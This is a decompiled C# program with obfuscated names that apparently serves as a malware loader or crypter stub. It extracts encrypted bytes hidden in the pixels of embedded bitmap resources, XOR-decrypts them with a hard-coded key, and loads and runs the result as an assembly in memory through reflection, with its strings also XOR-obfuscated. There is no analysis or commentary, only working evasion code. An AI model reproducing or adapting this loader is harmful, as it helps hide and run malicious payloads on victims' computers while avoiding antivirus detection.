using System;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class GClass0
{
	private static string string_0 = "VãjcKÇQJYÐÝëðølïØô8A8ÐÒóixþV0e";

	private static ResourceManager resourceManager_0 = new ResourceManager("wABmpeakHbXmM", Assembly.GetExecutingAssembly());

	private static byte[] Byte_0 => smethod_2(smethod_3((Bitmap)resourceManager_0.GetObject("mjN7RuZjjrH"), string_0));

	private static byte[] Byte_1 => smethod_2(smethod_3((Bitmap)resourceManager_0.GetObject("CicVkb7RwfYw9w"), string_0));

	[STAThread]
	public static void Main()
	{
		object[] object_ = new object[7]
		{
			Byte_0,
			smethod_1("900F113DA2237868FEB89395"),
			true,
			true,
			true,
			false,
			smethod_1("8A1E1625A222")
		};
		byte[] byte_ = Byte_1;
		string string_ = smethod_1("AA04092EA425");
		smethod_0(ref byte_, ref string_, ref object_);
	}

	public static void smethod_0(ref byte[] byte_0, ref string string_1, ref object[] object_0)
	{
		Assembly assembly = Assembly.Load(byte_0);
		object objectValue = RuntimeHelpers.GetObjectValue(assembly.CreateInstance(smethod_1("B11F0D1B82")));
		objectValue.GetType().InvokeMember(string_1, BindingFlags.InvokeMethod, null, RuntimeHelpers.GetObjectValue(objectValue), object_0);
	}

	public static string smethod_1(string string_1)
	{
		long num = (long)Math.Round((double)Strings.Len(string_1) / 2.0);
		string text = default(string);
		for (long num2 = 1L; num2 <= num; num2++)
		{
			int num3 = (int)Math.Round(Conversion.Val("&H" + Strings.Mid(string_1, (int)(2L * num2 - 1L), 2)));
			int num4 = Strings.AscW(Strings.Mid(string_0, (int)(num2 % Strings.Len(string_0) + 1L), 1));
			text += Conversions.ToString(Strings.ChrW(num3 ^ num4));
		}
		return text;
	}

	public static byte[] smethod_2(byte[] byte_0)
	{
		byte[] bytes = Encoding.Unicode.GetBytes(string_0);
		byte[] array = new byte[0];
		Array.Resize(ref array, bytes.Length);
		int num = 0;
		int num2 = byte_0.Length - 1 - (array.Length - 1);
		int num3 = byte_0.Length - 1;
		for (int i = num2; i <= num3; i++)
		{
			array[num] = byte_0[i];
			num++;
		}
		byte[] array2 = byte_0;
		Array.Resize(ref array2, byte_0.Length - array.Length);
		int num4 = 0;
		int num5 = array2.Length - 1;
		for (int i = 0; i <= num5; i++)
		{
			array2[i] = (byte)(byte_0[i] ^ array[num4] ^ bytes[num4]);
			num4 = ((num4 != bytes.Length - 1) ? (num4 + 1) : 0);
		}
		return array2;
	}

	public static byte[] smethod_3(Bitmap bitmap_0, string string_1)
	{
		byte[] array = default(byte[]);
		int num = default(int);
		try
		{
			int i = 0;
			for (int length = string_1.Length; i < length; i++)
			{
				char c = string_1[i];
				num += c;
			}
			int num2 = ((Image)bitmap_0).get_Width() * ((Image)bitmap_0).get_Height();
			for (int num3 = ((Image)bitmap_0).get_Width() - 1; num3 != 0; num3--)
			{
				Color pixel = bitmap_0.GetPixel(num3, ((Image)bitmap_0).get_Height() - 1);
				int num4 = 0;
				int num5 = (int)pixel.R % 255;
				num4 = pixel.B - (num5 % 255 + pixel.G) % 255 / 3;
				num4 = (num5 + 255 * num4) ^ num;
				if (num4 == 47)
				{
					num2--;
				}
				num5 = 0;
				pixel = default(Color);
				num4 = 0;
			}
			array = new byte[num2 + 1];
			int num6 = 0;
			for (int j = 0; j != ((Image)bitmap_0).get_Width(); j++)
			{
				int num7 = 0;
				while (num7 != ((Image)bitmap_0).get_Height())
				{
					Color pixel2 = bitmap_0.GetPixel(j, num7);
					int num8 = 0;
					int num9 = (int)pixel2.R % 255;
					num8 = pixel2.B - (num9 % 255 + pixel2.G) % 255 / 3;
					num8 = (num9 + 255 * num8) ^ num;
					if (num8 != 47)
					{
						array[num6] = (byte)(num8 - 255);
					}
					num9 = 0;
					pixel2 = default(Color);
					num8 = 0;
					num7++;
					num6++;
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		num = 0;
		for (int k = array.Length - (Encoding.Unicode.GetByteCount(string_0.ToCharArray()) - 1); k != array.Length; k++)
		{
			if (array[k] == 0)
			{
				Array.Resize(ref array, k);
				break;
			}
		}
		return array;
	}
}
